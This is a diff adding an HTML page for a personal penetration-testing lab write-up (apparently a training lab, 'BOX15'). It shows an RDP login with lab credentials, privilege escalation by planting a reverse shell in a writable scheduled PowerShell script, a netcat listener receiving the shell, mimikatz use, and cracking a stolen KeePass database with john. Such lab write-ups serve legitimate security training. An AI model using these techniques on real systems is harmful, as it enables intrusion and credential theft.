@@ -1,0 +1,149 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX15</h1>
+    <p class="text">Using xfreerdp3, I could easily enter the target server. Idk why but i couldn't use rdesktop.</p>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 xfreerdp3 /u:andrea /p:PasswordPassword_6 /v:172.16.67.15 /size:1600x900</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/relia/15/1.png' %}" alt="">
+        <p class="text">We have local.txt on the desktop. Though nxc returned pwned!, I couldn't open powershell with administrator privilege.</p>
+    </div>
+
+    <h2 class="subtitle">PrivEsc</h2>
+    <div class="code-box"><pre><code>PS C:\> type schedule.ps1
+
+try {
+    & C:\updatecollector\updatecollctor.exe
+
+} catch {
+
+    Write-Output "[-] Updates couldn't be collected!"
+    Write-Output "[!] Update cache will be used"
+}
+
+copy C:\Users\milana\beyondupdater.exe C:\updater\beyondupdater.exe
+Start-Sleep -Seconds 5
+& "C:\updater\beyondupdater.exe"
+Start-Sleep -Seconds 5
+del C:\updater\beyondupdater.exe</code></pre></div>
+
+<p class="text">I found schedule.ps1 file on the root directory.</p>
+
+<div class="code-box"><pre><code>PPS C:\> icacls schedule.ps1
+schedule.ps1 BUILTIN\Administrators:(I)(F)
+             NT AUTHORITY\SYSTEM:(I)(F)
+             BUILTIN\Users:(I)(RX)
+             NT AUTHORITY\Authenticated Users:(I)(M)</code></pre></div>
+<div class="code-box"><pre><code>Successfully processed 1 files; Failed processing 0 files
+PS C:\> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
+<u>NT AUTHORITY\Authenticated Users</u>           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
+RELIA\WKRDP                                Group            S-1-5-21-3972710054-930304531-4277621697-1115 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1   </code></pre></div>
+
+<p class="text">Since we are member of Authenticated Users, we can modify this file.</p>
+
+<div class="code-box"><pre><code>PS C:\> schtasks /query /v /fo LIST | findstr /I "schedule.ps1"
+Task To Run:                          powershell.exe -ep bypass -File C:\schedule.ps1
+Task To Run:                          powershell.exe -ep bypass -File C:\schedule.ps1</code></pre></div>
+<div class="code-box"><pre><code>PS C:\> get-acl schedule.ps1 | select-object Owner
+
+Owner       
+-----       
+RELIA\andrea</code></pre></div>
+
+<p class="text">Also, schedule.ps1 is namely scheduled. Let's use this to get andrea user shell.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/15/2.png' %}" alt="">
+    <p class="text">I added base64 revshell code to the schedule.ps1, and wait revshell come back.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ nc -lvnp 443 
+listening on [any] 443 ...
+connect to [192.168.45.222] from (UNKNOWN) [192.168.107.191] 64317
+whoami
+relia\milana
+PS C:\Windows\system32></code></pre></div>
+<p class="text">Also, whoami /priv returned tons of output, which means milana is local admin. So, I installed mimikatz and ran command as everytime, and then downloaded to my local machine.</p>
+
+<div class="code-box"><pre><code>PS C:\users\milana> tree /f
+Folder PATH listing
+Volume serial number is FE38-9A51
+C:.
+?   beyondupdater.exe
+?   
++---Contacts
++---Desktop
+?       mimikatz.exe
+?       proof.txt
+?       wk02_mimikatz
+?       
++---Documents
+?       <u>Database.kdbx</u>
+?       flag.ps1
+?       
++---Downloads
++---Favorites
+?   ?   Bing.url
+?   ?   
+?   +---Links
++---Links
+?       Desktop.lnk
+?       Downloads.lnk
+?       
++---Music
++---OneDrive
++---Pictures
+?   +---Camera Roll
+?   +---Saved Pictures
++---Saved Games
++---Searches
+?       winrt--{S-1-5-21-3972710054-930304531-4277621697-1124}-.searchconnector-ms
+?       
++---Videos
+    +---Captures</code></pre></div>
+
+    <p class="text">Also, I found Database.kdbx file. Let's download it too and decode it.</p>
+
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/15]
+└─$ ls
+Database.kdbx  wk02_mimikatz
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/15]
+└─$ keepass2john Database.kdbx > database.john
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/15]
+└─$ john database.john --wordlist=/usr/share/wordlists/rockyou.txt
+Database:destiny1</code></pre></div>
+<p class="text">I'm always thanksfull to the target user. They set weak password for kdbx file everytime:)</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/15/3.png' %}" alt="">
+    <p class="text">I found credential for sarah : placeholder, but the most interesting thing is it holds ssh id_rsa text. It would be a message that we can use this for BOX19 or BOX20, or both.</p>
+</div>
+
+</body>
+</html>
